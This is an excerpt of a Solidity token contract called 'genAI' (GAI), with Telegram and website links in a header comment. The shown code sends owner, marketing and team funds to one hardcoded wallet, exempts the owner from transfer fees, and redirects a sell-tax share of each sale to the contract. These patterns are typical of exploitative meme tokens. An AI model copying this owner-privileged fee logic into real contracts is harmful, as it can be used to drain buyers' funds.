...
/*
TG: https://t.me/nowaifunolaifuERC
Website: https://nowaifunolaifu.tools
*/
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xd82200c67Ab191C08502F89fa452b011eB2eE724; // owner address
...
contract AI is Context, IERC20, Ownable {
    ...
    string private _name = "genAI";
    string private _symbol = unicode"GAI";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xd82200c67Ab191C08502F89fa452b011eB2eE724); // 
    address payable public teamWalletAddress = payable(0xd82200c67Ab191C08502F89fa452b011eB2eE724); // 
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) 
            {
              ...
              contractTokenBalance = amount.mul(_totalTaxIfS).div(100);
            ...
            uint256 finalAmount = (owner()==sender || owner()==recipient) ? 
                                         amount : amount.sub(contractTokenBalance);
